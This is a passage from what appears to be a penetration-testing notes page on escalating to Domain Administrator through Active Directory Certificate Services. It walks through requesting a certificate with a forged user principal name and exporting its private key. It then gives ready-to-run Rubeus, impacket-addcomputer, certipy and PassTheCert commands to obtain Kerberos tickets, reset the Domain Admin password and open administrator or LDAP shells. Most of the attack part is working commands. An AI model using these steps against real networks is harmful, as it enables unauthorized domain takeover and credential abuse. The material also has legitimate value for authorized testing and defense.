<li>Enter <strong>‚Äúmmc‚Äù</strong> (Microsoft Management Console)* in the form and click OK. The console window opens.</li>
<li>In the MMC window, click <strong>File ‚Üí Add/Remote Snap-in.</strong>.</li>
<li>Add the <strong>‚ÄúCertificates‚Äù</strong> snap-in in the window then click OK.</li>
<li>Expand the Certificates in the left pane.</li>
<li>Right-click on the Personal and select <strong>All Tasks ‚Üí Request New Certificate</strong>.</li>
<li>The Certificate Enrollment window, click Next twice.</li>
<li>In Request Certificates section, click the <strong>‚ÄúMore information is required to enroll‚Ä¶‚Äù</strong>.</li>
<li>
<p>In Certificate Properties window, choose types and enter values in the form.</p>
<p>Subject name:</p>
<ul>
<li>Type: Common name</li>
<li>Value: <strong>vulncert</strong> (specify an arbitrary name)</li>
</ul>
<p>Alternative name:</p>
<ul>
<li>Type: User principal name</li>
<li>Value: <strong>tester@abc.example.com</strong>  (specify the impersonated name and the target domain)</li>
</ul>
</li>
<li>
<p>Add each name and click OK.</p>
</li>
<li>Return to the Request Certificates section. Check on the certificate we want to request, then click Enroll.</li>
<li>After finishing, expand <strong>Personal ‚Üí Certificates</strong>. We should see the new certificate is added.</li>
<li>Double-click on the certificate. The Certificate window opens.</li>
<li>In the Certificate window, select <strong>Details</strong> tab and choose <strong>Subject Alternative Name</strong>. We should see the principal name is our specified name e.g. tester@abc.example.com. If we can, click OK to close the window.</li>
<li>At the end, in the MMC window, right-click on the new certificate which we created and select <strong>All Tasks ‚Üí Export‚Ä¶</strong> to export the certificate. The Certificate Export Wizard opens.</li>
<li>In Export Private Key section, select <strong>‚ÄúYes, export the private key‚Äù</strong> and click Next.</li>
<li>In Export File Format, it is usually okey the default .PFX format so click Next without any changes.</li>
<li>In Security section, check the Password and enter new password.</li>
<li>In File to Export section, enter the file name and Next.</li>
<li>Finally click Finish then we could export the new malicious certificate.</li>
</ol>
<h3 id="2-impersonate-user-using-the-malicious-certificate">2. Impersonate User using the Malicious Certificate</h3>
<p>If we create a new certificate, we can use it to impersonate the privileged user.</p>
<ol>
<li>
<p><strong>Request Kerberos TGT (Ticket Granting Ticket).</strong></p>
<p><strong><a href="https://github.com/GhostPack/Rubeus">Rubeus.exe</a></strong> is useful to do for that. For details, see <a href="/exploit/windows/active-directory/kerberos-pentesting/#privilege-escalation-with-kerberos">Privilege Escalation with Kerberos</a>.</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">tester</span> <span class="p">/</span><span class="n">enctype</span><span class="p">:</span><span class="n">aes256</span> <span class="p">/</span><span class="n">certificate</span><span class="p">:</span><span class="n">vulncert</span><span class="p">.</span><span class="n">pfx</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="n">password</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">tester</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">labc</span><span class="p">.</span><span class="n">example</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">dc</span><span class="p">:&lt;</span><span class="n">ip_of_the_domain_controller</span><span class="p">&gt;</span>
</span></code></pre></div>
<p>After that, we should get the TGT (.kirbi file).<br />
We can gain access using the TGT by changing the password of the DA account.</p>
</li>
<li>
<p><strong>Change the Password of the DA (Domain Administrator) Account.</strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c"># changepw: Change the password of the target user</span>
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="c"># /ticket: Specify the TGT file (.kirbi) we&#39;ve generated</span>
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="c"># /new: New password for impersonated user</span>
</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="c"># /targetuser: Specify the Domain Administrator account name</span>
</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">changepw</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">tester</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">/</span><span class="n">new</span><span class="p">:</span><span class="n">newpass</span> <span class="p">/</span><span class="n">dc</span><span class="p">:&lt;</span><span class="n">ip_of_the_domain_controller</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">targetuser</span><span class="p">:</span><span class="n">abc</span><span class="p">.</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="p">\&lt;</span><span class="n">da_user_name</span><span class="p">&gt;</span>
</span></code></pre></div>
</li>
<li>
<p><strong>Get the Administrator‚Äôs Shell</strong></p>
<p>Using <strong>runas</strong> command, we can gain access to the Administrator‚Äôs account.<br />
Use the new password which we‚Äôve given the previous section in prompt.</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="n">runas</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">abc</span><span class="p">.</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="p">\&lt;</span><span class="n">da_user_name</span><span class="p">&gt;</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span>
</span></code></pre></div>
</li>
</ol>
<p><br /></p>
<h2 id="add-computer-and-privesc">Add Computer and PrivEsc</h2>
<h3 id="1-add-computer-to-the-domain">1. Add Computer to the Domain</h3>
<p>We can use the <strong>addcomputer (<a href="https://github.com/SecureAuthCorp/impacket">impacket</a>)</strong> which is usually used for AD CS (Active Directory Certificate Services) Privilege Escalation.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>impacket-addcomputer<span class="w"> </span><span class="s1">&#39;example.local/username:password&#39;</span><span class="w"> </span>-method<span class="w"> </span>LDAPS<span class="w"> </span>-computer-name<span class="w"> </span><span class="s1">&#39;TEST$&#39;</span><span class="w"> </span>-computer-pass<span class="w"> </span><span class="s1">&#39;password&#39;</span>
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="c1"># or</span>
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>impacket-addcomputer<span class="w"> </span><span class="s1">&#39;example.local/username:password&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span>-method<span class="w"> </span>LDAPS<span class="w"> </span>-computer-name<span class="w"> </span><span class="s1">&#39;TEST$&#39;</span><span class="w"> </span>-computer-pass<span class="w"> </span><span class="s1">&#39;password&#39;</span>
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="c1"># or</span>
</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>impacket-addcomputer<span class="w"> </span><span class="s1">&#39;example.local/username:password@example.com&#39;</span><span class="w"> </span>-method<span class="w"> </span>LDAPS<span class="w"> </span>-computer-name<span class="w"> </span><span class="s1">&#39;TEST$&#39;</span><span class="w"> </span>-computer-pass<span class="w"> </span><span class="s1">&#39;password&#39;</span>
</span></code></pre></div>
<h3 id="3-request-certificates">3. Request Certificates</h3>
<p>After adding new computer, we might be able to retrieve certificate using this computer account.<br />
At this time, try using alternate UPN (<strong><code>-upn</code></strong>) for administrator because we want to escalate privilege.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>certipy<span class="w"> </span>req<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;TEST$&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;password&#39;</span><span class="w"> </span>-ca<span class="w"> </span>VULN-CA<span class="w"> </span>-target<span class="w"> </span>example.local<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span>-dns<span class="w"> </span>ca.example.local<span class="w"> </span>-template<span class="w"> </span>Example<span class="w"> </span>-upn<span class="w"> </span>Administrator@example.local
</span></code></pre></div>
<p>If successful, the file which contains certificates and private key (e.g. <strong><code>administrator.pfx</code></strong>) will be saved in current directory.  </p>
<h3 id="4-authenticate-using-pfx">4. Authenticate using PFX</h3>
<p>We might be able to retrieve TGT using the <strong><code>.pfx</code></strong> file as below.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c1"># From outside of target machine</span>
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>certipy<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>administrator.pfx<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.0.0.1
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="c1"># From inside of target machine</span>
</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>Rubeus.exe<span class="w"> </span>asktgt<span class="w"> </span>/user:Administrator<span class="w"> </span>/certificate:administrator.pfx<span class="w"> </span>/ptt
</span></code></pre></div>
<p>Then using/cracking it to authenticate as Administrator.</p>
<h3 id="option-authenticate-over-ldap">Option: Authenticate over LDAP</h3>
<p>Reference: <a href="https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html">https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html</a></p>
<p>According to the article above, we may be able to authenticate over some protocols such as LDAP(S).
First off, split the <strong><code>administrator.pfx</code></strong> with <strong>certificate</strong> and <strong>private key</strong> using two commands below.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="c1"># Extract certificate by `-nokey` flag</span>
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>certipy<span class="w"> </span>cert<span class="w"> </span>-pfx<span class="w"> </span>administrator.pfx<span class="w"> </span>-nokey<span class="w"> </span>-out<span class="w"> </span>cert.crt
</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>
</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="c1"># Extract private key by `-nocert` flag</span>
</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>certipy<span class="w"> </span>cert<span class="w"> </span>-pfx<span class="w"> </span>administrator.pfx<span class="w"> </span>-nocert<span class="w"> </span>-out<span class="w"> </span>cert.key
</span></code></pre></div>
<p>After that, using <a href="https://github.com/AlmondOffSec/PassTheCert">PassTheCert</a>, we can spawn shell as Administrator via <strong>Schannel</strong> against <strong>LDAP(S)</strong>.</p>
<div class="language-sh highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>python3<span class="w"> </span>passthecert.py<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.0.0.1<span class="w"> </span>-crt<span class="w"> </span>cert.crt<span class="w"> </span>-key<span class="w"> </span>cert.key<span class="w"> </span>-domain<span class="w"> </span>example.local<span class="w"> </span>-port<span class="w"> </span><span class="m">636</span><span class="w"> </span>-action<span class="w"> </span>ldap-shell
</span></code></pre></div>
<p><br /></p>
<!-- ### 1. Request a New "Malicious" Certificate

```sh
# User Template
certipy req 'vuln.local/username:password@vuln.com' -ca VULN-CA  -template User
# Machine Template
certipy req 'vuln.local/machine-name:machine-password@vuln.com' -ca VULN-CA -template Machine

# After requesting it, use the output credential when authenticating
certipy auth -pfx user.pfx
certipy auth -pfx machine.pfx
``` -->

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/os/windows/privilege-escalation/windows-privesc-with-adcs.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ‚ö†Ô∏è The quieter you become, the more you are able to hear ü•∑</p>
</footer>

</body>
</html>